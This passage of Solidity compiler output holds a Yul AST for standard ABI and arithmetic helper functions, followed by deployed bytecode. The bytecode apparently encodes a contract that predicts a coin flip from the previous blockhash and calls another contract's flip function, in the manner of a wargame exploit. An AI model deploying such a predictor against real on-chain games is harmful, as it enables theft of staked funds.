                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "310:118:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "320:26:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "headStart",
                                    "nodeType": "YulIdentifier",
                                    "src": "332:9:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "343:2:4",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "add",
                                  "nodeType": "YulIdentifier",
                                  "src": "328:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "328:18:4"
                              },
                              "variableNames": [
                                {
                                  "name": "tail",
                                  "nodeType": "YulIdentifier",
                                  "src": "320:4:4"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value0",
                                    "nodeType": "YulIdentifier",
                                    "src": "394:6:4"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "407:9:4"
                                      },
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "418:1:4",
                                        "type": "",
                                        "value": "0"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "add",
                                      "nodeType": "YulIdentifier",
                                      "src": "403:3:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "403:17:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "abi_encode_t_bool_to_t_bool_fromStack",
                                  "nodeType": "YulIdentifier",
                                  "src": "356:37:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "356:65:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "356:65:4"
                            }
                          ]
                        },
                        "name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "282:9:4",
                            "type": ""
                          },
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "294:6:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "tail",
                            "nodeType": "YulTypedName",
                            "src": "305:4:4",
                            "type": ""
                          }
                        ],
                        "src": "218:210:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "479:32:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "489:16:4",
                              "value": {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "500:5:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "489:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_uint256",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "461:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "471:7:4",
                            "type": ""
                          }
                        ],
                        "src": "434:77:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "545:152:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "562:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "565:77:4",
                                    "type": "",
                                    "value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "555:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "555:88:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "555:88:4"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "659:1:4",
                                    "type": "",
                                    "value": "4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "662:4:4",
                                    "type": "",
                                    "value": "0x11"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "652:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "652:15:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "652:15:4"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "683:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "686:4:4",
                                    "type": "",
                                    "value": "0x24"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "676:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "676:15:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "676:15:4"
                            }
                          ]
                        },
                        "name": "panic_error_0x11",
                        "nodeType": "YulFunctionDefinition",
                        "src": "517:180:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "748:146:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "758:25:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "x",
                                    "nodeType": "YulIdentifier",
                                    "src": "781:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint256",
                                  "nodeType": "YulIdentifier",
                                  "src": "763:17:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "763:20:4"
                              },
                              "variableNames": [
                                {
                                  "name": "x",
                                  "nodeType": "YulIdentifier",
                                  "src": "758:1:4"
                                }
                              ]
                            },
                            {
                              "nodeType": "YulAssignment",
                              "src": "792:25:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "y",
                                    "nodeType": "YulIdentifier",
                                    "src": "815:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint256",
                                  "nodeType": "YulIdentifier",
                                  "src": "797:17:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "797:20:4"
                              },
                              "variableNames": [
                                {
                                  "name": "y",
                                  "nodeType": "YulIdentifier",
                                  "src": "792:1:4"
                                }
                              ]
                            },
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "839:22:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [],
                                      "functionName": {
                                        "name": "panic_error_0x11",
                                        "nodeType": "YulIdentifier",
                                        "src": "841:16:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "841:18:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "841:18:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "name": "x",
                                    "nodeType": "YulIdentifier",
                                    "src": "833:1:4"
                                  },
                                  {
                                    "name": "y",
                                    "nodeType": "YulIdentifier",
                                    "src": "836:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "lt",
                                  "nodeType": "YulIdentifier",
                                  "src": "830:2:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "830:8:4"
                              },
                              "nodeType": "YulIf",
                              "src": "827:34:4"
                            },
                            {
                              "nodeType": "YulAssignment",
                              "src": "871:17:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "x",
                                    "nodeType": "YulIdentifier",
                                    "src": "883:1:4"
                                  },
                                  {
                                    "name": "y",
                                    "nodeType": "YulIdentifier",
                                    "src": "886:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "sub",
                                  "nodeType": "YulIdentifier",
                                  "src": "879:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "879:9:4"
                              },
                              "variableNames": [
                                {
                                  "name": "diff",
                                  "nodeType": "YulIdentifier",
                                  "src": "871:4:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "checked_sub_t_uint256",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "x",
                            "nodeType": "YulTypedName",
                            "src": "734:1:4",
                            "type": ""
                          },
                          {
                            "name": "y",
                            "nodeType": "YulTypedName",
                            "src": "737:1:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "diff",
                            "nodeType": "YulTypedName",
                            "src": "743:4:4",
                            "type": ""
                          }
                        ],
                        "src": "703:191:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "928:152:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "945:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "948:77:4",
                                    "type": "",
                                    "value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "938:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "938:88:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "938:88:4"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1042:1:4",
                                    "type": "",
                                    "value": "4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1045:4:4",
                                    "type": "",
                                    "value": "0x12"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "1035:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1035:15:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1035:15:4"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1066:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1069:4:4",
                                    "type": "",
                                    "value": "0x24"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "1059:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1059:15:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1059:15:4"
                            }
                          ]
                        },
                        "name": "panic_error_0x12",
                        "nodeType": "YulFunctionDefinition",
                        "src": "900:180:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1128:143:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "1138:25:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "x",
                                    "nodeType": "YulIdentifier",
                                    "src": "1161:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint256",
                                  "nodeType": "YulIdentifier",
                                  "src": "1143:17:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1143:20:4"
                              },
                              "variableNames": [
                                {
                                  "name": "x",
                                  "nodeType": "YulIdentifier",
                                  "src": "1138:1:4"
                                }
                              ]
                            },
                            {
                              "nodeType": "YulAssignment",
                              "src": "1172:25:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "y",
                                    "nodeType": "YulIdentifier",
                                    "src": "1195:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint256",
                                  "nodeType": "YulIdentifier",
                                  "src": "1177:17:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1177:20:4"
                              },
                              "variableNames": [
                                {
                                  "name": "y",
                                  "nodeType": "YulIdentifier",
                                  "src": "1172:1:4"
                                }
                              ]
                            },
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "1219:22:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [],
                                      "functionName": {
                                        "name": "panic_error_0x12",
                                        "nodeType": "YulIdentifier",
                                        "src": "1221:16:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "1221:18:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "1221:18:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "name": "y",
                                    "nodeType": "YulIdentifier",
                                    "src": "1216:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "iszero",
                                  "nodeType": "YulIdentifier",
                                  "src": "1209:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1209:9:4"
                              },
                              "nodeType": "YulIf",
                              "src": "1206:35:4"
                            },
                            {
                              "nodeType": "YulAssignment",
                              "src": "1251:14:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "x",
                                    "nodeType": "YulIdentifier",
                                    "src": "1260:1:4"
                                  },
                                  {
                                    "name": "y",
                                    "nodeType": "YulIdentifier",
                                    "src": "1263:1:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "div",
                                  "nodeType": "YulIdentifier",
                                  "src": "1256:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1256:9:4"
                              },
                              "variableNames": [
                                {
                                  "name": "r",
                                  "nodeType": "YulIdentifier",
                                  "src": "1251:1:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "checked_div_t_uint256",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "x",
                            "nodeType": "YulTypedName",
                            "src": "1117:1:4",
                            "type": ""
                          },
                          {
                            "name": "y",
                            "nodeType": "YulTypedName",
                            "src": "1120:1:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "r",
                            "nodeType": "YulTypedName",
                            "src": "1126:1:4",
                            "type": ""
                          }
                        ],
                        "src": "1086:185:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1317:35:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "1327:19:4",
                              "value": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1343:2:4",
                                    "type": "",
                                    "value": "64"
                                  }
                                ],
                                "functionName": {
                                  "name": "mload",
                                  "nodeType": "YulIdentifier",
                                  "src": "1337:5:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1337:9:4"
                              },
                              "variableNames": [
                                {
                                  "name": "memPtr",
                                  "nodeType": "YulIdentifier",
                                  "src": "1327:6:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "allocate_unbounded",
                        "nodeType": "YulFunctionDefinition",
                        "returnVariables": [
                          {
                            "name": "memPtr",
                            "nodeType": "YulTypedName",
                            "src": "1310:6:4",
                            "type": ""
                          }
                        ],
                        "src": "1277:75:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1447:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1464:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1467:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "1457:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1457:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1457:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                        "nodeType": "YulFunctionDefinition",
                        "src": "1358:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1570:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1587:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1590:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "1580:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1580:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1580:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
                        "nodeType": "YulFunctionDefinition",
                        "src": "1481:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1644:76:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "1698:16:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "1707:1:4",
                                          "type": "",
                                          "value": "0"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "1710:1:4",
                                          "type": "",
                                          "value": "0"
                                        }
                                      ],
                                      "functionName": {
                                        "name": "revert",
                                        "nodeType": "YulIdentifier",
                                        "src": "1700:6:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "1700:12:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "1700:12:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "1667:5:4"
                                      },
                                      {
                                        "arguments": [
                                          {
                                            "name": "value",
                                            "nodeType": "YulIdentifier",
                                            "src": "1689:5:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "cleanup_t_bool",
                                          "nodeType": "YulIdentifier",
                                          "src": "1674:14:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "1674:21:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "eq",
                                      "nodeType": "YulIdentifier",
                                      "src": "1664:2:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1664:32:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "iszero",
                                  "nodeType": "YulIdentifier",
                                  "src": "1657:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1657:40:4"
                              },
                              "nodeType": "YulIf",
                              "src": "1654:60:4"
                            }
                          ]
                        },
                        "name": "validator_revert_t_bool",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "1637:5:4",
                            "type": ""
                          }
                        ],
                        "src": "1604:116:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1786:77:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "1796:22:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "offset",
                                    "nodeType": "YulIdentifier",
                                    "src": "1811:6:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "mload",
                                  "nodeType": "YulIdentifier",
                                  "src": "1805:5:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1805:13:4"
                              },
                              "variableNames": [
                                {
                                  "name": "value",
                                  "nodeType": "YulIdentifier",
                                  "src": "1796:5:4"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "1851:5:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "validator_revert_t_bool",
                                  "nodeType": "YulIdentifier",
                                  "src": "1827:23:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1827:30:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1827:30:4"
                            }
                          ]
                        },
                        "name": "abi_decode_t_bool_fromMemory",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "offset",
                            "nodeType": "YulTypedName",
                            "src": "1764:6:4",
                            "type": ""
                          },
                          {
                            "name": "end",
                            "nodeType": "YulTypedName",
                            "src": "1772:3:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "1780:5:4",
                            "type": ""
                          }
                        ],
                        "src": "1726:137:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1943:271:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "1989:83:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [],
                                      "functionName": {
                                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                                        "nodeType": "YulIdentifier",
                                        "src": "1991:77:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "1991:79:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "1991:79:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "1964:7:4"
                                      },
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "1973:9:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "sub",
                                      "nodeType": "YulIdentifier",
                                      "src": "1960:3:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1960:23:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1985:2:4",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "slt",
                                  "nodeType": "YulIdentifier",
                                  "src": "1956:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1956:32:4"
                              },
                              "nodeType": "YulIf",
                              "src": "1953:119:4"
                            },
                            {
                              "nodeType": "YulBlock",
                              "src": "2082:125:4",
                              "statements": [
                                {
                                  "nodeType": "YulVariableDeclaration",
                                  "src": "2097:15:4",
                                  "value": {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "2111:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  "variables": [
                                    {
                                      "name": "offset",
                                      "nodeType": "YulTypedName",
                                      "src": "2101:6:4",
                                      "type": ""
                                    }
                                  ]
                                },
                                {
                                  "nodeType": "YulAssignment",
                                  "src": "2126:71:4",
                                  "value": {
                                    "arguments": [
                                      {
                                        "arguments": [
                                          {
                                            "name": "headStart",
                                            "nodeType": "YulIdentifier",
                                            "src": "2169:9:4"
                                          },
                                          {
                                            "name": "offset",
                                            "nodeType": "YulIdentifier",
                                            "src": "2180:6:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "add",
                                          "nodeType": "YulIdentifier",
                                          "src": "2165:3:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "2165:22:4"
                                      },
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "2189:7:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "abi_decode_t_bool_fromMemory",
                                      "nodeType": "YulIdentifier",
                                      "src": "2136:28:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "2136:61:4"
                                  },
                                  "variableNames": [
                                    {
                                      "name": "value0",
                                      "nodeType": "YulIdentifier",
                                      "src": "2126:6:4"
                                    }
                                  ]
                                }
                              ]
                            }
                          ]
                        },
                        "name": "abi_decode_tuple_t_bool_fromMemory",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "1913:9:4",
                            "type": ""
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulTypedName",
                            "src": "1924:7:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "1936:6:4",
                            "type": ""
                          }
                        ],
                        "src": "1869:345:4"
                      }
                    ]
                  },
                  "contents": "{\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
                  "id": 4,
                  "language": "Yul",
                  "name": "#utility.yul"
                }
              ],
              "immutableReferences": {},
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cde4efa914610030575b600080fd5b61003861004e565b60405161004591906104ad565b60405180910390f35b600061007c7f76850f2a41eaa42348812d6d5f1d669a7dfb11e4456b2fb1ad2eb124261e3b8260001b61048f565b6100a87f751f14e66c3b71ecda3f72b84ebec8ac2372f93bc281773d93b1f8046e4c08cf60001b61048f565b6100d47f8d521d8b29d2f7e12007ddc485e4ab5b590c9b8e521741496161f42ec70551fb60001b61048f565b60006001436100e39190610501565b4060001c90506101157f662060cd93db46b0a7870aad764292e8d8eff36f707cce79f22b508dac3593f460001b61048f565b6101417f30f8bb24c4bce6a057fe33ce23d8bfe6dcbf9d1d8c6ce614f4b7d71c19a58c5960001b61048f565b8060005414156101d4576101777f80167d4be857c2e3ce4fbccedfcb18af7434b30a6107850ab7bf176b16b8f3ee60001b61048f565b6101a37ff86a990f2d4e49a86608b47806d370c06f946a2a71911ca8570b64ad0222842960001b61048f565b6101cf7f508c7ecdbb5c89e33970b00717ff3bbec1e8d85c8fa65ee25c9bc441ffa2aeac60001b61048f565b600080fd5b6102007fcebb1f23423d860039abfdd6de4ea9cd526f64eae6c7a2ca43652a28decb152360001b61048f565b61022c7fd28650fff2402b363aa03554769a7f21774984fb04141d96c83af86b2305a2b860001b61048f565b6102587fdd53802a684652e6ff47eec192d44e459d37ad95e1c80400a099f88bb72da0aa60001b61048f565b8060008190555061028b7f4f4c27566bff8b25f7ea94e31751d90ac087cc47eb08deeb001241cfd48b948060001b61048f565b6102b77ffbb1d0c55e02bb9d893b2a3e06a8c97572bea0142b4b752219615c1aa3318eb060001b61048f565b6000600154826102c79190610564565b90506102f57f035e1771c990810f7a4c2018da13fcb98239e42ce66f420dd8968f72a9957c6c60001b61048f565b6103217f3ffd3edfd7a0e8cf2cfd60c0ee819ed0865313a37b60c88c09401ef638f5582d60001b61048f565b600060018214610332576000610335565b60015b90506103637fd317f23fbc045d9b3a1066cd47ed89413e81c540fac2775c298eb70552c6962660001b61048f565b61038f7f9cbcfdfcf9428c4d31c21c35495f1f73631424eb11249428558df529a97fbecb60001b61048f565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016103ea91906104ad565b6020604051808303816000875af1158015610409573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061042d91906105c6565b5061045a7fa8810c2a02e392125a942131b93b61952186aded9b013761649689b55961b2c060001b61048f565b6104867fd6430e7489e14c1cb35138ebeb83af97ce82acd80c6a1d113fc554906c61d8ff60001b61048f565b80935050505090565b50565b60008115159050919050565b6104a781610492565b82525050565b60006020820190506104c2600083018461049e565b92915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061050c826104c8565b9150610517836104c8565b92508282101561052a576105296104d2565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061056f826104c8565b915061057a836104c8565b92508261058a57610589610535565b5b828204905092915050565b600080fd5b6105a381610492565b81146105ae57600080fd5b50565b6000815190506105c08161059a565b92915050565b6000602082840312156105dc576105db610595565b5b60006105ea848285016105b1565b9150509291505056fea264697066735822122060601e8ae20dffea0dd7749afd8ca348be79b15bbc939d103d2125e265